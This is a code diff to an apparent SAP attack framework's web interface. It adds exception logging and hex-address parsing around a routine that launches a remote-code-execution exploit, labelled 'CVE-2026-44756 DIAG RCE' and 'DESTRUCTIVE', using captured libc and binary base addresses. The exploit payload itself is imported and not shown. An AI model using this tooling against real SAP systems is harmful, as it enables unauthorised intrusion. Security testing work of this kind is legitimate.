@@ -8050,6 +8050,21 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 diag_port = 3200
 
         def _run():
+            # Wrap the whole run in a try/except so exceptions raised
+            # inside the background thread surface as a terminal log
+            # line — otherwise _bg silently drops them and the operator
+            # sees the flow stop after the "DESTRUCTIVE ..." header
+            # with no clue as to why.
+            try:
+                _run_impl()
+            except Exception as _exc:
+                import traceback as _tb
+                print(f"[-] {sid}: CVE-2026-44756 DIAG RCE aborted "
+                      f"with exception: {type(_exc).__name__}: {_exc}")
+                for _ln in _tb.format_exc().splitlines():
+                    print(f"[-]   {_ln}")
+
+        def _run_impl():
             from sap_cve_2026_44756_diag import (
                 auto_capture_bases,
                 trigger_diag_rce,
@@ -8063,8 +8078,22 @@ def create_app(api: SAPMAPApi) -> Bottle:
             # Resolve dw_base / libc_base — prefer operator override,
             # then cached values on the node, then auto-capture via
             # OS-exec.
-            dw_base = int(dw_hex, 16) if dw_hex else 0
-            libc_base = int(libc_hex, 16) if libc_hex else 0
+            def _parse_hex(name, s):
+                if not s:
+                    return 0
+                s = s.strip()
+                if s.lower().startswith("0x"):
+                    s = s[2:]
+                try:
+                    return int(s, 16)
+                except ValueError as e:
+                    raise ValueError(
+                        f"could not parse {name}={s!r} as hex — "
+                        f"expected format like '0x5627f6800000' or "
+                        f"'5627f6800000'") from e
+
+            dw_base = _parse_hex("dw_base_hex", dw_hex)
+            libc_base = _parse_hex("libc_base_hex", libc_hex)
 
             if not dw_base and node.cve_2026_44756_dw_base:
                 try:
@@ -8108,10 +8137,11 @@ def create_app(api: SAPMAPApi) -> Bottle:
 
             # rdx is per-instance.  Prefer operator override, then
             # cached node value.  If neither, prompt operator explicitly.
-            rdx = int(rdx_hex, 16) if rdx_hex else 0
+            rdx = _parse_hex("rdx_hex", rdx_hex)
             if not rdx and node.cve_2026_44756_session_rdx:
                 try:
-                    rdx = int(node.cve_2026_44756_session_rdx, 16)
+                    rdx = int(node.cve_2026_44756_session_rdx.lower()
+                                .lstrip("0x") or "0", 16)
                     print(f"[*] {sid}: using cached rdx {rdx:#x}")
                 except ValueError:
                     rdx = 0
